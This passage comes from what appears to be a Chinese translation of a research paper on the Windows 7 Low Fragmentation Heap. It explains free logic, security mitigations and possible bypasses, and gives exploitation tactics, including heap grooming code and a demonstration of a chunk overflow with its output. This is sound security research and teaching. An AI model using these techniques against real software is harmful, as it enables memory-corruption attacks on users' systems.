class="comment">//_InterlockedCompareExchange64</span></span><br><span class="line">    <span class="keyword">if</span>(AtomicSwap(&amp;SubSegment‐&gt;AggregateExchg, AggrExchg_New, AggrExchg))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if something has changed since swapping, try again</span></span><br><span class="line">    <span class="comment">//交换时如果发生了什么变化，就重试</span></span><br><span class="line">    ChunkHeader = ChunkHeader_Saved;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：你可以看到Subsegment-&gt;Hint是在这里赋值的，它将用于后续的分配。</p></blockquote><p>&emsp;&emsp;最后，将检查Sequence变量是否被设置成了0x3。如果是的话，就说明SubSegment需要执行更多操作，UserBlocks Chunk可以被释放(通过后端堆管理器)；如果不是的话，就会返回0x1。</p><p style="text-align:center;font-weight:bold">Listing 33. RtlpLowFragHeapFree Epilog</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if there are cached items handle them</span></span><br><span class="line"><span class="comment">//如果有缓存条目，就处理它们</span></span><br><span class="line">UpdateCache(SubSegment);</span><br><span class="line"></span><br><span class="line"><span class="comment">//if we've freed every item in the list update the subsegment and free the UserBlock</span></span><br><span class="line"><span class="comment">//如果我们释放了list中每一个条目，就更新Subsegment并释放UserBlock</span></span><br><span class="line"><span class="keyword">if</span>(Sequence == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">    PerformSubSegmentMaintenance(SubSegment);</span><br><span class="line">    RtlpFreeUserBlock(LFH, SubSegment‐&gt;UserBlocks);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><blockquote><p>注意：PerformSubSegmentMaintenance()不是一个真正的函数，只是一系列复杂指令的别名，它将为SubSegment做好释放或后续使用的准备。</p></blockquote><h4 id="Overview-概览-4"><a href="#Overview-概览-4" class="headerlink" title="Overview(概览)"></a>Overview(概览)</h4><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/RtlpLowFragHeapFree_overview.png" alt="RtlpLowFragHeapFree overview"></p><p style="text-align:center;font-weight:bold">Diagram 10. RtlpLowFragHeapFree overview</p><h4 id="Example-示例-1"><a href="#Example-示例-1" class="headerlink" title="Example(示例)"></a>Example(示例)</h4><p>&emsp;&emsp;继续看本文分配一节中的例子，我们将进行第三次的0x30字节的连续分配。这意味着还有0x27个Chunks剩余(每个0x30大小)，并且到下一个块的当前偏移量是UserBlock的0x14; 它看起来像这样：</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/UserBlock_after_the_3rd_consecutive_allocation_for_0x30_bytes.png" alt="UserBlock after the 3rd consecutive allocation for 0x30 bytes"></p><p style="text-align:center;font-weight:bold">Diagram 11. UserBlock after the 3rd consecutive allocation for 0x30 bytes</p><p>&emsp;&emsp;当我们释放从LFH分配的内存时会发生什么呢？如前所述，该内存实际上并没有移动到任何地方，只是Offset被更新，它用作UserBlocks中下一个空闲Chunk位置的索引。</p><p>&emsp;&emsp;现在假设从UserBlocks分配的第一个Chunk被释放了，此时需要更新第一个Chunk的Offset，并将Depth递增0x1。通过获取Chunk Header的地址，减去UserBlock的地址，然后将结果除以0x8，可以计算出新的Offset。也就是说，新的Offset来源于UserBlock的相对位置(以blocks为单位)。下面的图展示了UserBlock在第一个Chunk被释放时的状态。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Freeing_of_the_1st_chunk_allocated_for_0x30_bytes.png" alt="Freeing of the 1st chunk allocated for 0x30 bytes"></p><p style="text-align:center;font-weight:bold">Diagram 12. Freeing of the 1st chunk allocated for 0x30 bytes</p><p>&emsp;&emsp;现在想象一下，已分配的第二个Chunk也被释放了(在其他任何分配或释放之前)。新的Offset就会变成0x8，这是因为第二个Chunk的释放在第一个Chunk之后。尽管在Offset 0x2处有空闲Chunk，但下一个被用来分配的Chunk位置位于Offset 0x8。这可以想象成是一个链表，它更新它的指针而不是其地址。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Freeing_of_the_2nd_chunk_allocated_for_0x30_bytes.png" alt="Freeing of the 2nd chunk allocated for 0x30 bytes"></p><p style="text-align:center;font-weight:bold">Diagram 13. Freeing of the 2nd chunk allocated for 0x30 bytes</p><h2 id="Security-Mechanisms-安全机制"><a href="#Security-Mechanisms-安全机制" class="headerlink" title="Security Mechanisms(安全机制)"></a>Security Mechanisms(安全机制)</h2><p>&emsp;&emsp;大部分在Windows XP SP2中引入的安全机制在Windows 7中并未发生变化，而Windows 7中还引入了一些其他的的安全机制(基于Windows Vista代码)。本节我们将讨论其中的一些安全措施，包括它们是如何实现的，以及对于每个机制的一些想法。话虽如此，我认为在Windows Vista代码基础上引入的所有保护逻辑对Windows堆的漏洞利用产生了迄今为止最大的障碍。</p><h3 id="Heap-Randomization-堆随机化"><a href="#Heap-Randomization-堆随机化" class="headerlink" title="Heap Randomization(堆随机化)"></a>Heap Randomization(堆随机化)</h3><p>&emsp;&emsp;堆随机化的目的在于使HeapBase拥有一个不可预测的地址。每次创建堆时，都会在基地址上增加一个随机的偏移以防止可预测的内存地址。</p><p>&emsp;&emsp;这在RtlCreateHeap()中通过创建一个随机的64k对齐的值并增加到HeapBase上实现。每次执行应用程序时，此值将尝试产生一个变化的地址。随机化可能取决于Heap大小的最大值，该值由传递给HeapCreate()的参数计算出来。下面的代码片段源于RtlCreateHeap()，它试图随机化HeapBase：</p><p style="text-align:center;font-weight:bold">Listing 34. RtlCreateHeap randomization</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> BaseAddress = Zero;</span><br><span class="line"><span class="keyword">int</span> RandPad = Zero;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get page aligned size to use as a random pad</span></span><br><span class="line"><span class="comment">//获取页对齐大小作为随机数pad</span></span><br><span class="line"><span class="keyword">int</span> RandPad = (RtlpHeapGenerateRandomValue64() &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if maxsize + pad wraps, null out the randpad</span></span><br><span class="line"><span class="comment">//如果maxsize + pad溢出了，就零化randpad</span></span><br><span class="line"><span class="keyword">int</span> TotalMaxSize = MaximumSize + RandPad;</span><br><span class="line"><span class="keyword">if</span>(TotalMaxSize &lt; MaximumSize)</span><br><span class="line">&#123;</span><br><span class="line">    TotalMaxSize = MaximumSize;</span><br><span class="line">    RandPad = Zero;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0x2000 = MEM_RESERVE</span></span><br><span class="line"><span class="comment">//0x40 = PAGE_EXECUTE_READWRITE</span></span><br><span class="line"><span class="comment">//0x04 = PAGE_READWRITE</span></span><br><span class="line"><span class="comment">//this will reserve the memory at the baseaddress but NOT actually commit any memory at this point</span></span><br><span class="line"><span class="comment">//这将保留位于基址的内存，但此时不会实际提交任何内存</span></span><br><span class="line"><span class="keyword">int</span> Opts = <span class="number">0x4</span>;</span><br><span class="line"><span class="keyword">if</span>(Options &amp; <span class="number">0x40000</span>)</span><br><span class="line">    Opts = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(NtAllocateVirtualmemory(‐<span class="number">1</span>, &amp;BaseAddress, <span class="number">0x0</span>, &amp;TotalMaxSize, <span class="number">0x2000</span>, Opts)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">Heap = (_HEAP*)BaseAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//adjust the heap pointer by randpad if possible</span></span><br><span class="line"><span class="comment">//如果可能的话，用randpad来调整堆指针</span></span><br><span class="line"><span class="keyword">if</span>(RandPad != Zero)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(RtlpSecMemFreeVirtualMemory(‐<span class="number">1</span>, &amp;BaseAddress, &amp;RandPad, <span class="number">0x8000</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        Heap = (_HEAP*)RandPad + BaseAddress;</span><br><span class="line">        MaximumSize = TotalSize ‐ RandPad;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Comments-注解"><a href="#Comments-注解" class="headerlink" title="Comments(注解)"></a>Comments(注解)</h4><p>&emsp;&emsp;对堆来说当使用随机化时，实际上基地址的数量是有限的，这是因为它们需要64k对齐(5bits熵)。通过熵的缺陷来猜测堆基地址可能不切实际，但也不是完全没有可能。</p><p>&emsp;&emsp;另一个不太可能的情景源于这样一个事实：如果RandPad+MaximumSize越界，那么RandPad将为NULL。这将有效的使堆随机化无效。我之所以说它不太可能发生是基于两个原因：首先它无法控制HeapCreate()的传参。我知道在应用程序中这可以发生，但它并不通用。其次获取一个足够大的MaximumSize堆往往会引起NtAllocateVirtualMemory()返回NULL，总之是完全失败的。</p><h3 id="Header-Encoding-Decoding-堆头编码-解码"><a href="#Header-Encoding-Decoding-堆头编码-解码" class="headerlink" title="Header Encoding/Decoding(堆头编码/解码)"></a>Header Encoding/Decoding(堆头编码/解码)</h3><p>&emsp;&emsp;在Windows Vista之前，判断Chunk没有被损坏的唯一方法就是校验Chunk头部的1字节cookie。这显然不是鲁棒性最好的解决方案，因为这个cookie可以被暴力猜解出来，更为重要的是，在这之前有着头部数据(McDonald/Valasek 2009)。</p><p>&emsp;&emsp;于是编码Chunk头部的措施应运而生。现在，堆将对每个_HEAP_ENTRY的前4字节进行编码。这将阻止对Size, Flags和Checksum溢出产生的影响。通过异或Chunk Header的前3个字节并存储到SmallTagIndex变量中来完成编码，此后Chunk Header的前4个字节会与Heap-&gt;Encoding进行异或(由RtlCreateHeap()随机产生)。</p><p style="text-align:center;font-weight:bold">Listing 35. Heap header encoding</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EncodeHeader(_HEAP_ENTRY *Header, _HEAP *Heap)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(Heap‐&gt;EncodeFlagMask)</span><br><span class="line">    &#123;</span><br><span class="line">        Header‐&gt;SmallTagIndex =</span><br><span class="line">            (BYTE)Header ^ (Byte)Header+<span class="number">1</span> ^ (Byte)Header+<span class="number">2</span>;</span><br><span class="line">        (DWORD)Header ^= Heap‐&gt;Encoding;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;对Chunk进行解码和编码很像，但是在实际完成解码前需要进行一些额外的检查。需要确保Chunk的头部被编码过。</p><p style="text-align:center;font-weight:bold">Listing 36. Heap header decoding</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DecodeHeader(_HEAP_ENTRY *Header, _HEAP *Heap)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(Heap‐&gt;EncodeFlagMask &amp;&amp; (Header &amp; Heap‐&gt;EncodeFlagMask))</span><br><span class="line">    &#123;</span><br><span class="line">        (DWORD)Header ^= Heap‐&gt;Encoding;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Comments-注解-1"><a href="#Comments-注解-1" class="headerlink" title="Comments(注解)"></a>Comments(注解)</h4><p>&emsp;&emsp;对Chunk头部起始4字节的编码，使得覆写Size, Flags或是Checksum字段的操作在不使用信息泄露(info leak)的情况下几乎不可行(Hawkes 2008)。但这也没有阻止我们覆写Chunk头部的其他信息：如果Chunk头部可以被覆写且在值校验之前被使用，那么它就有可能改变执行流。我们会在后续章节中讨论。</p><p>&emsp;&emsp;另一个可行的回避方案是去覆写堆管理器，使其认为Chunk是没有被编码的。有多种方法可以做到。第一个也是可能性最低的方法就是NULL化Heap-&gt;EncodeFlagMask(被初始化为0x100000)。后续的任何编解码操作都不会进行。这种方法有些缺陷，因为随之而来的是显著的堆不稳定性。一般会创建一个新的堆来达到这种效果(_HEAP_ENTRY头的未编码覆盖)。</p><p>&emsp;&emsp;第二种也是最有可能的方法是通过覆盖Chunk头的前4字节，使得其与Heap-&gt;EncodeFlagMask的AND位操作可以返回false。这种方法可对Size, Flags和Checksum进行有限的控制。这仅对覆盖FreeLists中头部有用，因为校验和验证是在分配过程中完成的。</p><p>&emsp;&emsp;最后，攻击者可以将Chunk头的后4个字节作为目标。我们此前已经看过了，这些字段用于判断Chunk的状态。例如，Chunk头0x7偏移字节用来判断Chunk是来自LFH(前端)还是后端。</p><h3 id="Death-of-bitmap-flipping-位图翻转的死亡"><a href="#Death-of-bitmap-flipping-位图翻转的死亡" class="headerlink" title="Death of bitmap flipping(位图翻转的死亡)"></a>Death of bitmap flipping(位图翻转的死亡)</h3><p>&emsp;&emsp;在Brett Moore的“Heaps about Heaps”一文中，曾对如何欺骗FreeList使其误判自身的填充状态的手法进行了介绍。从那开始，这种手法一度被称为位图翻转(Moore 2008)。这种攻击手法在较新的Windows版本中被直接解决了，因为在2009年McDonald和Valasek输出了一篇质量相当高的论文。(注：这是100％不正确的)</p><p>&emsp;&emsp;在Windows XP代码基础上，XOR操作用来更新bitmap。如果逻辑上可以触发该更新操作且此时FreeList为空的话，在bitmap中当前的位会对自身进行XOR操作，这就会使得它的值翻转。</p><p style="text-align:center;font-weight:bold">Listing 37. Death of Bitmap Flipping</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if we unlinked from a dedicated free list and emptied it,clear the bitmap</span></span><br><span class="line"><span class="comment">// 如果我们对专门的freelist摘除并清空，就会清除bitmap</span></span><br><span class="line"><span class="keyword">if</span> (reqsize &lt; <span class="number">0x80</span> &amp;&amp; nextchunk == prevchunk)</span><br><span class="line">&#123;</span><br><span class="line">    size = SIZE(chunk);</span><br><span class="line">    BitMask = <span class="number">1</span> &lt;&lt; (size &amp; <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// note that this is an xor</span></span><br><span class="line">    <span class="comment">// 注意到这是个xor</span></span><br><span class="line">    FreeListsInUseBitmap[size &gt;&gt; <span class="number">3</span>] ^= vBitMask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这种技术的问题在于一旦Chunk的Size被损坏了，你就可以在不应该更改专用FreeList的情况下更改其状态；这就会导致我们可以进一步去覆盖HeapBase中的关键数据。</p><p>&emsp;&emsp;当更新bitmap来显示一个空链表时，按位与AND操作被使用到，这确保了空的链表可以保持空的状态，而被填充过的链表仅仅可以被标记为空。对于标记一个链表为填充态来说也是一样的，它使用按位或OR操作来改变ListsInUserUlong。如此，一个空的链表可以被标志为填充态，但已填充的链表却不能变成未填充态。</p><p>&emsp;&emsp;以上的这些修改，专用FreeLists的概念已经消失了，所以试图从空的链表中分配仅仅是遍历FreeList结构来找到一个大小充足的Chunk。</p><p style="text-align:center;font-weight:bold">Listing 38. Death of Bitmap Flipping 2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HeapAlloc</span></span><br><span class="line">size = SIZE(chunk);</span><br><span class="line">BitMask = <span class="number">1</span> &lt;&lt; (Size &amp; <span class="number">0x1F</span>);</span><br><span class="line">BlocksIndex‐&gt;ListInUseUlong[Size &gt;&gt; <span class="number">5</span>] &amp;= ~BitMask;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HeapFree</span></span><br><span class="line">size = SIZE(chunk);</span><br><span class="line">BitMask = <span class="number">1</span> &lt;&lt; (Size &amp; <span class="number">0x1F</span>);</span><br><span class="line">BlocksIndex‐&gt;ListInUseUlong[Size &gt;&gt; <span class="number">5</span>] |= BitMask;</span><br></pre></td></tr></table></figure><h3 id="Safe-Linking-安全链入"><a href="#Safe-Linking-安全链入" class="headerlink" title="Safe Linking(安全链入)"></a>Safe Linking(安全链入)</h3><p>&emsp;&emsp;Safe Unlinking机制最早在Windows XP SP2中提出，它可以防止从FreeList上取下Chunk(或者合并两个空闲Chunk)时4字节覆写的行为。从这开始，大量通用的堆的利用被阻止。</p><p>&emsp;&emsp;尽管从链表中取下一个条目不能再进行任意地址覆写，但仍然可以覆写FreeList[0]上某个条目的blink去指向你想覆写的地址(Moore 2005)。如此，一旦一个Chunk被插入到了被修改的条目之前，blink就会指向刚刚被释放的Chunk的地址。</p><p>&emsp;&emsp;在后端堆管理器中新的检查机制在链入一个空闲Chunk前校验了Chunk的blink。我们在解释RtlpFreeHeap()工作机制时看到了这部分代码，让我们来回顾一下。你可以看到如果FreeList的Blink-&gt;Flink不是指向自身，那就认为它已经被破坏而不会再执行链入操作。</p><p style="text-align:center;font-weight:bold">Listing 39. Safe Linking</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(InsertList‐&gt;Blink‐&gt;Flink == InsertList)</span><br><span class="line">&#123;</span><br><span class="line">    ChunkToFree‐&gt;Flink = InsertList;</span><br><span class="line">    ChunkToFree‐&gt;Blink = InsertList‐&gt;Blink;</span><br><span class="line">    InsertList‐&gt;Blink‐&gt;Flink = ChunkToFree;</span><br><span class="line">    InsertList‐&gt;Blink = ChunkToFree;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    RtlpLogHeapFailure();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Comments-注解-2"><a href="#Comments-注解-2" class="headerlink" title="Comments(注解)"></a>Comments(注解)</h4><p>&emsp;&emsp;虽然该设备通过损坏的Blink指针阻止了指针覆写操作，但它仍然存在着一个问题，那就是在RtlpLogHeapFailure()之后进程并没有终止。后面的代码直接把Chunk插入到合适的ListHints槽，而实际上并没有更新flink和blink。这意味着flink和blink是用户完全可控的（译者注：因为flink和blink在data域，释放之后用作flink和blink不会被零化，所以在不改写的情况下释放前是什么释放后还是什么）。</p><h2 id="Tactics-利用策略"><a href="#Tactics-利用策略" class="headerlink" title="Tactics(利用策略)"></a>Tactics(利用策略)</h2><h3 id="Heap-Determinism-堆确定性"><a href="#Heap-Determinism-堆确定性" class="headerlink" title="Heap Determinism(堆确定性)"></a>Heap Determinism(堆确定性)</h3><p>&emsp;&emsp;这些年研究者把精力集中在堆的元数据之上，以达成执行流改写。这一琐碎的任务越来越困难了。通用的4字节写攻击已经灭亡，堆头现在也用伪随机数进行了编码，保护了它的完整性，现在即使是老如欺骗FreeList插入攻击的技巧也基本失效了。</p><p>&emsp;&emsp;现在，比以往任何时候，漏洞利用程序在尝试设置有利条件时都必须具有很高的精确度。我们在讨论堆时，称之为堆的精心操纵(heap manipulation)。Chunk大小、分配或是释放操作的命令在现代的Windows堆利用中确实发挥了重要作用。</p><p>&emsp;&emsp;在本节中，我将尝试讨论在尝试使用LFH使堆处于确定性状态时发生的一些常见场景。比如，哪个位置会分配Chunk X？与分配的Chunk X毗邻的是什么？如果Chunk X被释放会发生什么？</p><h4 id="Activating-the-LFH-激活LFH"><a href="#Activating-the-LFH-激活LFH" class="headerlink" title="Activating the LFH(激活LFH)"></a>Activating the LFH(激活LFH)</h4><p>&emsp;&emsp;理解对特定Bucket如何激活LFH是最为基础的信息之一。LFH对Windows 7来说是唯一的前端堆管理器，但这并不意味着它会默认处理所有的特定大小Chunk的分配请求。如上面代码所展示，LFH必须由后端堆管理器的启发式机制激活。如果您可以强制进行分配(这也是相当常见的)，那么你就可以为特定大小的Bucket激活LFH。LFH可以由至少0x12次连续分配相同大小Chunk的操作来激活(或者0x11，如果LFH此前已被激活)。</p><p style="text-align:center;font-weight:bold">Listing 40. Enable the LFH for a specific size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 =&gt; Heap‐&gt;CompatibilityFlags |= 0x20000000;</span></span><br><span class="line"><span class="comment">//0x11 =&gt; RtlpPerformHeapMaintenance(Heap);</span></span><br><span class="line"><span class="comment">//0x11 =&gt; FreeList‐&gt;Blink = LFHContext + 1;</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x12</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocation 0x%02x for 0x%02x bytes\n"</span>, i, SIZE);</span><br><span class="line">    allocb[i] = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//now that the _HEAP_BUCKET is in the ListHint‐&gt;Blink, the LFH will be used</span></span><br><span class="line"><span class="comment">//现在_HEAP_BUCKET在ListHint‐&gt;Blink中，LFH会被使用</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocation 0x%02x for 0x%02x bytes\n"</span>, i++, SIZE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tFirst serviced by the LFH\n"</span>);</span><br><span class="line">allocb[i] = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如你所见，为特定大小激活和启用LFH相当简单，如果你有能力控制分配的话，诸如分配DOM对象。现在前端堆管理器是为特定的大小而使用，可以步步为营达成更高层次的确定性。</p><h4 id="Defragmentation-碎片整理"><a href="#Defragmentation-碎片整理" class="headerlink" title="Defragmentation(碎片整理)"></a>Defragmentation(碎片整理)</h4><p>&emsp;&emsp;在我们讨论在LFH上布置相邻的Chunks之前，必需要先讨论碎片化。因为频繁的分配和释放操作，UserBlock Chunk会碎片化。这意味着必须要进行碎片整理操作以保证我们溢出的Chunk与我们想要覆写的Chunk毗邻。</p><p>&emsp;&emsp;在下一个例子中我们将把Chunks直接的相邻布局作为前提。尽管处理新的SubSegment是相当简单的，因为当前没有任何坑洞，但是使用已使用的SubSegment则不会有这个问题。下图展示了单次分配不会导致3个毗邻的对象，为此必须要先占坑。最简单的方法就是对当前应用程序的内存布局有一些了解然后做出一些分配动作。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Defragmentation1.png" alt="Defragmentation1"></p><p>&emsp;&emsp;在这种情况下，我们仅需要进行3次分配就可以填充这些坑洞，但是很显然这不是个现实的例子。攻击者往往不知道具体有多少坑洞需要去填充，也不知道需要多少个分配才能完全耗尽UserBlocks(Depth==0x0)。于是就强制堆管理器来创建一个新的SubSegment，他不会包含任何坑洞(说明：感谢Alex/Matt)。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Defragmentation2.png" alt="Defragmentation2"></p><h4 id="Adjacent-Data-相邻的数据"><a href="#Adjacent-Data-相邻的数据" class="headerlink" title="Adjacent Data(相邻的数据)"></a>Adjacent Data(相邻的数据)</h4><p>&emsp;&emsp;当试图利用基于堆缓冲区溢出时，最难的任务之一就是精心操纵堆，使得堆的状态已知。你要确保溢出的Chunk与想要被覆写的Chunk是直接毗邻的。通常对后端堆来说，释放内存时的合并操作非常棘手，它会导致exp的不可靠。</p><blockquote><p>注意：在Windows XP/2003 Heap Exploitation这个demo中，试图利用堆缓冲区溢出漏洞时，这可谓是最难的任务。应用程序的多线程特性会不可靠的合并Chunks，让我们对堆的精心操纵失效。</p></blockquote><p>&emsp;&emsp;LFH不会合并Chunks，因为它们的大小全部一致。因此，相对于它们与UserBlock的偏移量进行索引。这使得相同大小的Chunks可以挨着放置非常简单。如果可以溢出，BUSY和FREE态Chunks都可以被覆写，这依赖于UserBlocks当前的状态。</p><p>&emsp;&emsp;假设我们想要覆写alloc3的信息，并且处于write-n的情景。只要在alloc3之前有可能溢出的分配，就可以覆盖alloc3中的数据。</p><p style="text-align:center;font-weight:bold">Listing 42. LFH Chunk overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">EnableLFH(SIZE);</span><br><span class="line">NormalizeLFH(SIZE);</span><br><span class="line"></span><br><span class="line">alloc1 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"></span><br><span class="line">alloc2 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"><span class="built_in">memset</span>(alloc2, <span class="number">0x42</span>, SIZE);</span><br><span class="line">*(alloc2 + SIZE‐<span class="number">1</span>) = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">alloc3 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"><span class="built_in">memset</span>(alloc3, <span class="number">0x43</span>, SIZE);</span><br><span class="line">*(alloc3 + SIZE‐<span class="number">1</span>) = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"alloc2 =&gt; %s\n"</span>, alloc2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"alloc3 =&gt; %s\n"</span>, alloc3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(alloc1, <span class="number">0x41</span>, SIZE * <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Post overflow..\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"alloc2 =&gt; %s\n"</span>, alloc2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"alloc3 =&gt; %s\n"</span>, alloc3);</span><br></pre></td></tr></table></figure><p style="text-align:center;font-weight:bold">Listing 43. LFH Chunk overflow result</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Result:</span><br><span class="line">alloc2 =&gt; BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">alloc3 =&gt; CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br><span class="line">Post overflow..</span><br><span class="line">alloc2 =&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCCC</span><br><span class="line">CCCCCCCCC</span><br><span class="line">alloc3 =&gt; AAAAAAAAAAAAAAAAAAAAAAAACCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如你所见，alloc3中的数据被覆盖成了溢出的alloc1数据。另一个值得注意的影响在于溢出发生后alloc2字符串的长度。该字符串的长度实际上是alloc2和alloc3组合在一起的长度，因为null终止符被覆盖掉了。可以阅读Peter Vreugdenhil的论文(Vreugdenhil 